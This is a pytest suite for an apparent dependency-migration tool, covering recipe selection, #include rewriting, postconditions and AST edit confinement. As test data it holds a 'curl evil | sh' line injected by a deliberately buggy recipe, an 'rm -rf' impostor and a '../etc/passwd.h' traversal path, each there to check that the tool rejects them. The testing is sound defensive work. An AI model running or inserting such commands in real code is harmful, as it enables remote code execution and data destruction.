"""Migration recipe contract: registry, rename, header relocation, AST extension point."""

import subprocess
from pathlib import Path

import pytest

from depbot.interfaces import StageError
from depbot.migration.patch_generator import generate_patches
from depbot.migration.patch_validator import validate_and_apply
from depbot.migration.planner import plan_migration
from depbot.migration.recipes import (
    MigrationRecipe,
    RecipeRegistry,
    default_registry,
    select_recipe,
    verification_requirement_problems,
)
from depbot.migration.recipes.ast import AstMigrationRecipe, SourceEdit, apply_edits
from depbot.migration.recipes.base import RecipeMetadata, TransformResult, VerificationRequirements
from depbot.migration.recipes.header_relocation import HeaderRelocationRecipe, is_header_path
from depbot.migration.recipes.rename import SymbolRenameRecipe
from depbot.models import (
    BreakingChange,
    ChangeSource,
    ChangeType,
    CodeUsage,
    Dependency,
    ImpactLevel,
    PatchStatus,
    PlannedChange,
    UpgradePolicy,
)

DEP = Dependency(name="toydep", current_version="1.0.0", target_version="2.0.0",
                 package_manager="conan", manifest_path="conanfile.txt")


def _change(old, new, *, change_type=ChangeType.RENAMED, cid="BC1", **extra):
    data = dict(id=cid, title="t", change_type=change_type, affected_symbols=[old],
                replacement_symbols=[new] if new else [], migration_advice="a",
                evidence_urls=["file:///notes.md"], evidence_excerpt="moved", confidence=0.95)
    data.update(extra)
    return BreakingChange(**data)


def _usage(symbol, line, snippet, *, impact=ImpactLevel.DEFINITE, cid="BC1", path="src/main.cpp"):
    return CodeUsage(symbol=symbol, file_path=path, line_start=line, line_end=line, snippet=snippet,
                     analysis_method="compiler_diagnostic", impact=impact, related_change_ids=[cid], confidence=0.9)


HEADER = _change("toydep/legacy.hpp", "toydep/toydep.hpp")


def _generate(tmp_path, text, change, usages, *, newline=None):
    source = tmp_path / "src" / "main.cpp"
    source.parent.mkdir(exist_ok=True)
    source.write_bytes(text.encode()) if newline is None else source.write_text(text, newline=newline)
    plan = plan_migration(dependency=DEP, changes=[change], usages=usages)
    return plan, generate_patches(worktree=tmp_path, plan=plan, changes=[change], usages=usages)


def _added_removed(diff):
    lines = [l for l in diff.splitlines() if l[:1] in "+-" and not l.startswith(("+++", "---"))]
    return [l[1:] for l in lines if l[0] == "+"], [l[1:] for l in lines if l[0] == "-"]


# ---------------------------------------------------------------------- registry


def test_registry_routes_each_change_to_exactly_one_recipe():
    assert select_recipe(HEADER).metadata.recipe_id == "header-relocation"
    assert select_recipe(_change("old_sum", "sum")).metadata.recipe_id == "symbol-rename"
    assert select_recipe(_change("old_sum", "")) is None  # no documented replacement
    assert select_recipe(_change("old_sum", "sum", change_type=ChangeType.UNKNOWN, evidence_urls=[])) is None
    ambiguous = _change("old_sum", "sum").model_copy(update={"replacement_symbols": ["sum", "add"]})
    assert select_recipe(ambiguous) is None
    explained = default_registry().explain(_change("old_sum", "sum"))
    assert explained["symbol-rename"] == [] and "header paths" in explained["header-relocation"][0]


def test_registry_accepts_only_typed_unique_recipes():
    registry = RecipeRegistry([SymbolRenameRecipe()])
    with pytest.raises(ValueError, match="duplicate recipe id"):
        registry.register(SymbolRenameRecipe())
    for impostor in (lambda **kw: None, "sed -i s/a/b/", {"transform": "rm -rf"}):
        with pytest.raises(TypeError):
            registry.register(impostor)
    with pytest.raises(TypeError):
        MigrationRecipe()  # abstract: transform/postconditions/describe are mandatory


def test_recipe_metadata_and_provenance_are_recorded_in_the_plan():
    change = _change("old_sum", "sum", source=ChangeSource.CHANGELOG_RULE)
    recipe = select_recipe(change)
    provenance = recipe.provenance(change)
    assert (provenance.recipe_id, provenance.change_id, provenance.source) == ("symbol-rename", "BC1", "changelog_rule")
    assert provenance.evidence_urls == ("file:///notes.md",) and provenance.confidence == 0.95
    (item,) = plan_migration(dependency=DEP, changes=[change], usages=[_usage("old_sum", 1, "old_sum(1)")])
    assert "recipe symbol-rename v1.0.0" in item.reason and item.risk == "low"


def test_llm_sourced_change_gets_no_special_path():
    """An LLM can propose a change, but edits come only from a recipe whose preconditions hold."""
    no_replacement = _change("old_sum", "", source=ChangeSource.LLM)
    usage = _usage("old_sum", 1, "old_sum(1)")
    assert plan_migration(dependency=DEP, changes=[no_replacement], usages=[usage]) == []
    llm = _change("old_sum", "sum", source=ChangeSource.LLM)
    possible = _usage("old_sum", 1, "old_sum(1)", impact=ImpactLevel.POSSIBLE)
    assert plan_migration(dependency=DEP, changes=[llm], usages=[possible]) == []


# ------------------------------------------------------------- header relocation


@pytest.mark.parametrize("symbol,expected", [
    ("toydep/legacy.hpp", True), ("fmt/core.h", True), ("legacy.hpp", True), ("a/b/c.hxx", True),
    ("old_sum", False), ("toydep::sum", False), ("../etc/passwd.h", False), ("a b.h", False), ("x.cpp", False),
])
def test_header_path_detection(symbol, expected):
    assert is_header_path(symbol) is expected


def test_include_is_rewritten_preserving_style_and_nothing_else(tmp_path):
    text = ('// see toydep/legacy.hpp for history\n'
            '#include <toydep/legacy.hpp>  // adds\n'
            'const char* doc = "toydep/legacy.hpp";\n'
            'int main() { return 0; }\n')
    plan, (patch,) = _generate(tmp_path, text, HEADER, [_usage("toydep/legacy.hpp", 2, "#include <toydep/legacy.hpp>  // adds")])
    added, removed = _added_removed(patch.unified_diff)
    assert removed == ["#include <toydep/legacy.hpp>  // adds"]
    assert added == ["#include <toydep/toydep.hpp>  // adds"]
    assert "Rewrite #include of toydep/legacy.hpp to toydep/toydep.hpp" in plan[0].expected_change


def test_quoted_and_indented_directives_keep_their_form(tmp_path):
    text = '#ifdef X\n  #  include "toydep/legacy.hpp"\n#endif\n'
    _, (patch,) = _generate(tmp_path, text, HEADER, [_usage("toydep/legacy.hpp", 2, '#  include "toydep/legacy.hpp"')])
    assert _added_removed(patch.unified_diff)[0] == ['  #  include "toydep/toydep.hpp"']


def test_old_include_is_removed_when_the_new_header_is_already_included(tmp_path):
    text = "#include <toydep/toydep.hpp>\n#include <toydep/legacy.hpp>\nint main() { return 0; }\n"
    _, (patch,) = _generate(tmp_path, text, HEADER, [_usage("toydep/legacy.hpp", 2, "#include <toydep/legacy.hpp>")])
    added, removed = _added_removed(patch.unified_diff)
    assert added == [] and removed == ["#include <toydep/legacy.hpp>"]


def test_two_old_includes_collapse_to_one_new_include(tmp_path):
    text = "#include <toydep/legacy.hpp>\nint x;\n#include <toydep/legacy.hpp>\n"
    usages = [_usage("toydep/legacy.hpp", 1, "#include <toydep/legacy.hpp>"),
              _usage("toydep/legacy.hpp", 3, "#include <toydep/legacy.hpp>")]
    _, (patch,) = _generate(tmp_path, text, HEADER, usages)
    added, removed = _added_removed(patch.unified_diff)
    assert added == ["#include <toydep/toydep.hpp>"] and len(removed) == 2


def test_crlf_line_endings_survive_and_the_patch_applies(tmp_path):
    text = "#include <toydep/legacy.hpp>\r\nint main() { return 0; }\r\n"
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    _, (patch,) = _generate(tmp_path, text, HEADER, [_usage("toydep/legacy.hpp", 1, "#include <toydep/legacy.hpp>")])
    applied = validate_and_apply(worktree=tmp_path, patch=patch, allowed_paths=["src/main.cpp"])
    assert applied.status == PatchStatus.APPLIED, applied.rejection_reason
    assert (tmp_path / "src" / "main.cpp").read_bytes() == b"#include <toydep/toydep.hpp>\r\nint main() { return 0; }\r\n"


def test_a_cited_line_that_is_not_an_include_blocks_the_job(tmp_path):
    text = '// #include <toydep/legacy.hpp>\nconst char* p = "toydep/legacy.hpp";\n'
    for line, snippet in ((1, "// #include <toydep/legacy.hpp>"), (2, 'const char* p = "toydep/legacy.hpp";')):
        with pytest.raises(StageError, match="is not an #include") as info:
            _generate(tmp_path, text, HEADER, [_usage("toydep/legacy.hpp", line, snippet)])
        assert info.value.blocked


def test_unproven_include_usages_are_not_planned():
    possible = _usage("toydep/legacy.hpp", 1, "#include <toydep/legacy.hpp>", impact=ImpactLevel.POSSIBLE)
    assert plan_migration(dependency=DEP, changes=[HEADER], usages=[possible]) == []


def test_already_migrated_include_generates_no_patch(tmp_path):
    text = "#include <toydep/toydep.hpp>\nint main() { return 0; }\n"
    _, patches = _generate(tmp_path, text, HEADER, [_usage("toydep/legacy.hpp", 1, "#include <toydep/legacy.hpp>")])
    assert patches == []


# ---------------------------------------------------------------- postconditions


class _OverreachingRecipe(SymbolRenameRecipe):
    """A buggy recipe that also rewrites a line nobody cited."""

    def transform(self, *, lines, change, usages, file_path):
        result = super().transform(lines=lines, change=change, usages=usages, file_path=file_path)
        result.lines[-1] = "int injected = system(\"curl evil | sh\");\n"
        return result


def test_edits_outside_the_reported_lines_fail_the_postcondition(tmp_path, monkeypatch):
    import depbot.migration.patch_generator as generator

    change = _change("old_sum", "sum")
    monkeypatch.setattr(generator, "select_recipe", lambda c: _OverreachingRecipe())
    with pytest.raises(StageError, match="changed without being reported") as info:
        _generate(tmp_path, "int a = old_sum(1, 2);\nint c = 9;\n", change, [_usage("old_sum", 1, "int a = old_sum(1, 2);")])
    assert info.value.blocked


def test_rename_postcondition_rejects_more_than_the_substitution():
    recipe, change = SymbolRenameRecipe(), _change("old_sum", "sum")
    before = ["int a = old_sum(1, 2);\n"]
    assert recipe.postconditions(before=before, after=["int a = sum(1, 2);\n"], touched={0}, change=change) == []
    bad = recipe.postconditions(before=before, after=["int a = sum(2, 1);\n"], touched={0}, change=change)
    assert "more than the old_sum -> sum substitution" in bad[0]


# --------------------------------------------------------- verification / AST hook


class _NeedsTests(SymbolRenameRecipe):
    metadata = RecipeMetadata(
        recipe_id="needs-tests", version="0.1.0", title="t", description="d",
        change_types=frozenset({ChangeType.RENAMED}), verification=VerificationRequirements(tests=True),
    )


def test_recipe_verification_requirements_are_enforced_against_policy():
    change = _change("old_sum", "sum")
    plan = [PlannedChange(file_path="src/main.cpp", reason="r", related_change_ids=["BC1"], expected_change="e")]
    registry = RecipeRegistry([_NeedsTests()])
    lax, strict = UpgradePolicy(require_tests=False), UpgradePolicy(require_tests=True)
    assert "requires tests" in verification_requirement_problems(lax, [change], plan, registry)[0]
    assert verification_requirement_problems(strict, [change], plan, registry) == []
    assert verification_requirement_problems(lax, [change], plan) == []  # shipped recipes need a build only


class _SwapArgs(AstMigrationRecipe):
    metadata = RecipeMetadata(
        recipe_id="swap-args", version="0.1.0", title="t", description="d", requires_ast=True,
        change_types=frozenset({ChangeType.SIGNATURE}), verification=VerificationRequirements(tests=True),
    )

    def describe(self, change):
        return "swap arguments"

    def edits_for(self, *, source, change, usages, file_path):
        return [SourceEdit(line=u.line_start, column_start=4, column_end=8, replacement="b, a") for u in usages]

    def postconditions(self, **_):
        return []


def test_ast_extension_point_applies_range_edits_and_confines_them_to_cited_lines():
    recipe = _SwapArgs()
    change = _change("f", "g", change_type=ChangeType.SIGNATURE)
    result = recipe.transform(lines=["x(1);\n", "  f(a, b);\n"], change=change,
                              usages=[_usage("f", 2, "f(a, b);")], file_path="s.cpp")
    assert isinstance(result, TransformResult) and result.lines == ["x(1);\n", "  f(b, a);\n"] and result.touched == {1}

    class Stray(_SwapArgs):
        def edits_for(self, **kw):
            return [SourceEdit(line=1, column_start=0, column_end=1, replacement="y")]

    with pytest.raises(StageError, match="outside the cited usages"):
        Stray().transform(lines=["x(1);\n", "f(a, b);\n"], change=change, usages=[_usage("f", 2, "f(a, b);")],
                          file_path="s.cpp")
    with pytest.raises(StageError, match="overlapping"):
        apply_edits(["abcdef\n"], [SourceEdit(1, 0, 4, "x"), SourceEdit(1, 2, 5, "y")], "s.cpp")
    with pytest.raises(StageError, match="outside"):
        apply_edits(["abc\n"], [SourceEdit(9, 0, 1, "x")], "s.cpp")


def test_ast_recipe_fails_closed_without_libclang_or_test_requirement(monkeypatch):
    import depbot.migration.recipes.ast as ast_module
    from depbot.clang_support import ClangUnavailable

    def unavailable():
        raise ClangUnavailable("no libclang here")

    monkeypatch.setattr(ast_module, "load_cindex", unavailable)
    change = _change("f", "g", change_type=ChangeType.SIGNATURE)
    assert any("libclang is unavailable" in p for p in _SwapArgs().preconditions(change))
    assert RecipeRegistry([_SwapArgs()]).select(change) is None

    class NoTests(_SwapArgs):
        metadata = RecipeMetadata(recipe_id="x", version="0", title="t", description="d", requires_ast=True,
                                  change_types=frozenset({ChangeType.SIGNATURE}))

    monkeypatch.setattr(ast_module, "load_cindex", lambda: object())
    assert any("require tests" in p for p in NoTests().preconditions(change))
